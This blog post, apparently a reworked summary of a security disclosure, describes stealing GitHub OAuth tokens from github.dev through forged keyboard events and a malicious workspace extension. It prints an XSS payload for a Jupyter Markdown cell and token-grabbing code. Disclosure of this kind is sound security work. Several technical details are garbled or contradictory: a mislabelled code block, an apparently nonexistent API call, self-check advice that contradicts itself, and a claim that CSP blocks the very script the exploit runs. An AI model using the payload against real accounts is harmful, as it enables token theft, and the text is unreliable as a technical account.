---
layout: post
title: "1-Click GitHub Token Stealing via a VSCode Bug"
date: 2026-06-02
banner: "/assets/images/covers/dmitry-chernyshov-mP7aPSUm7aE-unsplash.jpg"
categories: [AI Coding, Security, VSCode]
tags: [security, vscode, github, vulnerability-analysis, ai-coding]
---

> 📅 June 2, 2026 · 🔖 Security / VSCode / GitHub · ⏱️ ~12 min read

**TL;DR:** Click a single link and attackers steal your full GitHub OAuth token from github.dev — with read/write access to all your repositories, including private ones. This is a multi-stage exploit chain targeting VSCode's Webview security model, keyboard event hijacking, and extension trust bypass.

---

## Table of Contents

1. [Background: How Powerful Is github.dev?](#1-background-how-powerful-is-githubdev)
2. [VSCode Webview Security Model](#2-vscode-webview-security-model)
3. [The Exploit Chain](#3-the-exploit-chain)
4. [Technical Deep Dive: How keydown Events Are Hijacked](#4-technical-deep-dive-how-keydown-events-are-hijacked)
5. [PoC Code Analysis](#5-poc-code-analysis)
6. [Comparison: Desktop vs Web VSCode](#6-comparison-desktop-vs-web-vscode)
7. [Protection & Self-Check](#7-protection--self-check)
8. [What VSCode Did Right](#8-what-vscode-did-right)
9. [Why Full Disclosure](#9-why-full-disclosure)
10. [Timeline](#10-timeline)

---

## 1. Background: How Powerful Is github.dev?

You may have used github.dev — changing `github.com` to `github.dev` in any repository URL opens a lightweight VSCode running entirely in your browser.

But this capability is far more powerful than most users realize:

| Capability | github.com | github.dev |
|------------|-----------|-----------|
| View private repo files | ✅ | ✅ |
| Send Pull Requests | ✅ | ✅ |
| Commit code | ❌ | ✅ |
| Token scope | Repository-limited | **All repositories** |

The critical issue: **github.dev's OAuth token grants access to ALL your repositories, not just the current one.**

Combined with the fact that this browser-based app runs millions of lines of VSCode TypeScript code, github.dev becomes an irresistible target for vulnerability researchers.

---

## 2. VSCode Webview Security Model

VSCode is an Electron desktop app. In VSCode, executing arbitrary JavaScript = full remote code execution (RCE). That's why VSCode implements sandbox isolation. Today we focus on VSCode's **Webview**.

### Three-Layer Defense Architecture

```
┌─────────────────────────────────────────────────────┐
│              Main Window (vscode-file://)          │
│                                                     │
│  ┌─────────────────────────────────────────────┐   │
│  │         Webview iframe (vscode-webview://)   │   │
│  │                                             │   │
│  │   <iframe src="vscode-webview://xxx">       │   │
│  │   Fully isolated origin, no Electron API    │   │
│  └─────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘
```

### The postMessage() Mechanism (The Only Legal Communication Channel)

Two frames cannot directly access each other's DOM. The only legitimate communication method is `window.postMessage()`:

```javascript
// Main window → Webview
webview.contentWindow.postMessage({ command: 'showLine', line: 42 }, '*')

// Webview → Main window
window.parent.postMessage({ type: 'navigate', url: './README.md' }, '*')
```

---

## 3. The Exploit Chain

### Step 1: Exploiting the did-keydown Event

VSCode Webview registers a keydown event listener to enable keyboard shortcuts inside Webviews:

```javascript
contentWindow.addEventListener('keydown', handleInnerKeydown)
```

When a user presses Ctrl+Shift+P inside a Webview, the keydown event **bubbles up to the parent window**, causing VSCode to show the command palette.

**Problem: No mechanism verifies these keydown events come from real users.**

### Step 2: Forging Keyboard Events

The attacker runs arbitrary JavaScript in the Webview and can fire forged keydown events:

```javascript
// Forge Ctrl+Shift+P (open command palette)
const ctrlShiftP = new KeyboardEvent('keydown', {
    key: 'P', code: 'KeyP', ctrlKey: true, shiftKey: true, bubbles: true
});
document.dispatchEvent(ctrlShiftP);
```

### Step 3: Using Ctrl+Shift+A to Trigger Notification Button Click

The command palette opens, but you can't inject text into the input box (browsers don't treat script-dispatched events as user input).

However, VSCode's "Notifications: Accept Notification Primary Action" keyboard shortcut directly listens to `keydown` and can be reliably triggered:

```javascript
// Fire Ctrl+Shift+A → click the notification's primary button
const csa = new KeyboardEvent('keydown', {
    key: 'A', code: 'KeyA', ctrlKey: true, shiftKey: true, bubbles: true
});
document.dispatchEvent(csa);
```

### Step 4: Bypassing Extension Trust Checks

VSCode 1.97+ has a publisher trust system. Extensions from new publishers trigger a confirmation dialog. But **Local Workspace Extensions** (in `.vscode/extensions/` directory) **skip this check**:

> "As long as you're in a trusted workspace (github.dev/web workspaces are always trusted), extensions in .vscode/extensions/ can be installed directly."

### Complete Attack Sequence

```
1. User clicks malicious link → opens attacker's repo on github.dev
2. Repo contains Jupyter Notebook with a Markdown cell executing JS payload
3. Payload waits for notification popup (extension recommendation prompt)
4. Payload fires Ctrl+Shift+A → accepts notification, installs malicious extension
5. Malicious extension retrieves GitHub OAuth Token
6. Extension queries api.github.com/user/repos → steals private repo list
```

---

## 4. Technical Deep Dive: How keydown Events Are Hijacked

### Why Can't You Type into the Command Palette?

The command palette uses an HTML `<input>` element. Its value can only be changed by genuine user input. Events dispatched by scripts are ignored by the browser (`isTrusted: false`).

### But Navigation and Selection Work

```
↑ Arrow  → Move up in list
↓ Arrow  → Move down in list
Enter    → Select current item
```

### Keyboard Shortcut vs Input Box Competition

VSCode's built-in keyboard shortcuts listen to `keydown` events in the bubbling phase, with higher priority than the command palette's input listener. So forged shortcuts work, but text input doesn't.

---

## 5. PoC Code Analysis

```python
# Malicious Jupyter Notebook payload (simplified)
# Full PoC: https://github.dev/ammaraskar/github-dev-token-steal-poc

# XSS payload in Markdown cell
<img src="data:foobar" onerror="
    // Step 1: Wait for extension recommendation notification to pop up
    setTimeout(() => {
        // Step 2: Ctrl+Shift+A → click notification primary button
        document.dispatchEvent(new KeyboardEvent('keydown', {
            key: 'A', code: 'KeyA',
            ctrlKey: true, shiftKey: true, bubbles: true
        }));
    }, 1000);

    // Step 3: After malicious extension activates, Ctrl+F1 triggers install
    setTimeout(() => {
        document.dispatchEvent(new KeyboardEvent('keydown', {
            key: 'F1', code: 'F1', ctrlKey: true, bubbles: true
        }));
    }, 3000);
">
```

### How the Malicious Extension Steals Tokens

```javascript
// Read GitHub Token from VSCode environment (via VSCode API)
const token = await vscode.env.session.getToken();

// Or read via document.cookie (for github.dev)
const cookies = document.cookie;
const ghToken = cookies.match(/github_token=([^;]+)/)?.[1];
```

---

## 6. Comparison: Desktop vs Web VSCode

| Dimension | Desktop VSCode | github.dev (Web) |
|-----------|---------------|------------------|
| Attack threshold | Requires victim to clone repo & open specific file | **Single click** |
| Initial attack surface | Needs XSS or other RCE | Just visiting a page |
| Token theft | Via extension reading | Via Cookie/VSCode API |
| Exploitation difficulty | Medium (need to convince victim) | **Extremely low (one-click)** |
| Fix difficulty | Need to fix Webview message mechanism | Added confirmation dialog |

---

## 7. Protection & Self-Check

### If You've Never Used github.dev

✅ Leave immediately and clear cookies and local storage:

1. Click the small lock icon in the URL bar
2. Go to Cookies and site data → Manage on-device site data
3. Delete all github.dev-related data

### If You've Ever Passed That Dialog

⚠️ **You're already compromised.** github.dev has no CSRF token, so any external link can attack you.

**Emergency measures:**

1. Go to GitHub → Settings → Security → "Active sessions" → revoke unfamiliar sessions
2. Check installed extensions list for suspicious entries
3. Consider revoking all GitHub OAuth app access and re-authorizing

### Verify If You're Affected

```javascript
// Check github.dev cookie
document.cookie.match(/github_token/)
```

---

## 8. What VSCode Did Right

VSCode's defense-in-depth approach is commendable:

| Technique | Purpose |
|-----------|---------|
| iframe isolation | Prevent DOM access to main window |
| Strict CSP | `script-src 'none'` blocks inline script execution |
| DOMPurify | Sanitize HTML in Markdown |
| Publisher trust system | Block unknown-source extensions |

Even if an attacker finds XSS, `script-src 'none'` prevents arbitrary JavaScript execution. This limits the exploit's impact.

---

## 9. Why Full Disclosure

The author's previous experience reporting a VSCode vulnerability to MSRC was disappointing:

> "They quietly fixed the vulnerability without any credit and marked it as 'no security impact'."

Reasons for choosing full disclosure this time:

1. **Hope for a longer fix notice period**
2. **Security research requires time and effort investment and shouldn't be taken for granted**
3. **This is one of the few levers to influence MSRC and VSCode's security posture**

---

## 10. Timeline

| Date | Event |
|------|-------|
| 2026-06-02 | Informed GitHub security contact of impending disclosure |
| 2026-06-02 | Full disclosure on GitHub issue and blog |
| 2026-06-03 | Microsoft applied temporary fix (added confirmation dialog, skip trust publisher check) |

---

> 🔗 Original: https://blog.ammaraskar.com/github-token-stealing/
> 📂 Tags: #security #vscode #github #vulnerability-analysis #ai-coding